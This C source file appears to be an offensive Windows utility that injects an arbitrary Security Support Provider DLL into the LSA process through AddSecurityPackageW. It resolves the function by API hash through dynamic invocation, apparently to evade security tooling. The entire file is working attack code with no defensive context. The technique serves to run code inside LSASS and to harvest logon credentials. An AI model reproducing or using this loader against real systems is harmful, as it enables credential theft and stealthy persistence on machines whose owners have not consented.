#define SECURITY_WIN32
#include <Windows.h>
#include <sspi.h>
#include "dinvoke.h"
#include <stdio.h>

#define AddSecurityPackageW_SW2_HASH 0x1da01a1e
#define SSPICLI_DLL L"SSPICLI.DLL"

typedef NTSTATUS(WINAPI* AddSecurityPackageW_t) (LPWSTR pszPackageName, PSECURITY_PACKAGE_OPTIONS pOptions);


BOOL is_full_path(LPCSTR filename)
{
    char c;

    c = filename[0] | 0x20;
    if (c < 97 || c > 122)
        return FALSE;

    c = filename[1];
    if (c != ':')
        return FALSE;

    c = filename[2];
    if (c != '\\')
        return FALSE;

    return TRUE;
}

void load_ssp(LPSTR ssp_path)
{
    AddSecurityPackageW_t AddSecurityPackageW = NULL;
    wchar_t ssp_path_w[MAX_PATH] = { 0 };

    if (!is_full_path(ssp_path))
    {
        printf("You must provide a full path: %s\n", ssp_path);
        return;
    }

    AddSecurityPackageW = (AddSecurityPackageW_t)get_function_address(get_library_address(SSPICLI_DLL, TRUE), AddSecurityPackageW_SW2_HASH, 0);
    if (!AddSecurityPackageW)
    {
        printf("Address of 'AddSecurityPackageW' not found\n");
        return;
    }

    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
    SECURITY_PACKAGE_OPTIONS spo = { 0 };
    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);
    if (status == SEC_E_SECPKG_NOT_FOUND)
        printf("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
    else
        printf("Done, status: 0x%lx\n", status);
}

int main(int argc, char* argv[])
{
    if (argc == 2)
        load_ssp(argv[1]);

    return 0;
}
